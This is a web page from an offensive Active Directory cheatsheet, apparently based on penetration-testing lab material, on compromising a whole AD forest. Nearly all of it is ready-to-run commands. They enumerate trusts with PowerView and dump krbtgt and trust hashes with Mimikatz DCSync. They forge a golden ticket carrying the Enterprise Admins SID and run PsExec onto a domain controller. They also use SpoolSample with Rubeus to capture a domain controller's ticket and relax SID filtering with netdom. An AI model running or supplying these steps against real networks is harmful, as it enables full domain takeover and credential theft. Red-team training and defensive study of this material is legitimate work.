---
layout: page
title: "# Pwning a AD Forest"
permalink: /ad_cheatsheets/pwning_ad_forest
---

# Pwning a AD Forest

## Forest Enumeration

```powershell
#Check for trusted domains with NLTest
nltest /trusted_domains

#Check for trusted domains with PowerShell & .NET
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

#Check for trusted domains with PowerView
Get-DomainTrust -API

#Check for trusted domains with LDAP
Get-DomainTrust
```

## Enumerate users and objects in different domains of the forest

```powershell
#PowerView (using the -Domain flag)
Get-DomainUser -Domain corp1.com
```

## Get NTLM Hash of trusted domain (query domain computeraccount) with MimiKatz

```powershell
lsadump::dcsync /domain:prod.corp1.com /user:corp1$
```

## Create Golden Ticket for Enterprise Admins to be admin in every domain with MimiKatz (adding extra SID)

```powershell
#Get NTLM hash of current domain KRBTGT account:
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt

#We need the domain SID's for the current domain and the target domain. We use Get-DomainSID from PowerView:
Get-DomainSID -Domain prod.corp1.com
Get-DomainSid -Domain corp1.com

#We need the RID of the Enterprise Admins group. This is a static value of 519 and we will append this to the SID.

#Craft the Golden Ticket that will grant us Enterprise Admin membership in corp1.com. /sid is current domain and /sids is target domain + RID of 519:
kerberos::golden /user:%USERNAME% /domain:prod.corp1.com /sid:S-1-5-21-3776646582-
2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-
1095350385-1831131555-2412080359-519 /ptt

#Access domain controller in new domain with PSExec:
c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd

```

## Use Print Spooler bug to own forest

*This technique does not require Domain Admin privileges. However, if we have Domain Admin
privileges and no servers with unconstrained delegation exist in our current domain, we can
create one ourselves by modifying the configuration of one of the servers.

```powershell
#Let's try to access the print spooler in another domain (this is a requirement):
ls \\rdc01\pipe\spoolss

#From and administrative prompt use Rubeus to monitor for new tickets from the root domain controller machine account
Rubeus.exe monitor /interval:5 /filteruser:RDC01$

#Launch the SpoolSample attack to the remote domain to force the print change notification from rdc01:
.\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com

#A new forwardable TGT is received in Rubeus. We can use Rubeus to inject it into memory:
Rubeus.exe ptt /ticket:%TICKETNAME%

#Perform replication with MimiKatz to get the NTLM hash of the remote administrator:
lsadump::dcsync /domain:corp1.com /user:corp1\administrator

```

## Get Forests Trusts between multiple forests

```powershell
#Powershell:
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRel
ationships()

#PowerView (if selective authentication is not enabled):
Get-DomainTrust -Domain corp1.com

#PowerView - Get ForestTrusts
Get-ForestTrust

#Powerview - Get all mappings
Get-DomainTrustMapping

```

## Forest User Enumeration

### Get users in another forest

```powershell
#Powershell:
Get-DomainUser -Domain corp2.com
```

### Get Users from current domain that are a groupmember in another forest

```powershell
#Powerview
Get-DomainForeignGroupMember -Domain corp2.com
```

### Get members of a specific group in another trusted domain

```powershell
#Enumerater members of the remote forest built-in Administrator's group (PowerView):
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
```

## Get the SID of a domain:

```powershell
Get-DomainSID -domain corp1.com
```

## Use NetDom to relax SID History between [Corp1.com](http://corp1.com) and [Corp2.com](http://corp2.com) (other forest)

*Note - SID filtering will still be active. Microsoft dictated that any SID with a RID less than 1000 will always be filtered regardless of the SID history setting. And if the custom group we attempt to abuse is a member a global security group like Domain Admins or Enterprise Admins, that access will also be filtered. Only group membership in domain local security groups is not filtered. The built-in Administrators group is a domain local group.

```powershell
#Perform this as a Corp1.com administrator
netdom trust %Source-Domain% /d:%Target-Domain% /enablesidhistory:yes

#Example
netdom trust corp1.com /d:corp2.com /enablesidhistory:yes

#Check if setting is changed (look for "TREAT_AS_EXTERNAL" on target domain)
Get-DomainTrust -Domain corp2.com
```

*RID less than 1000 will always be filtered regardless of the SID history setting. A non-default group will always have a RID equal to or higher than 1000. If we can find a custom group whose membership will allow us to compromise a user or computer, we can use that as an entry point. Another important thing to note is that when the custom group we attempt to abuse is a
member a global security group like Domain Admins or Enterprise Admins, that access will
also be filtered. Only group membership in domain local security groups is not filtered.

So enumerate for instance the domain local "Administrators"  group (*Get-DomainGroupMember -Identity "Administrators" -Domain [corp2.com](http://corp2.com/)*) on the target domain to check for custom groups that are member.
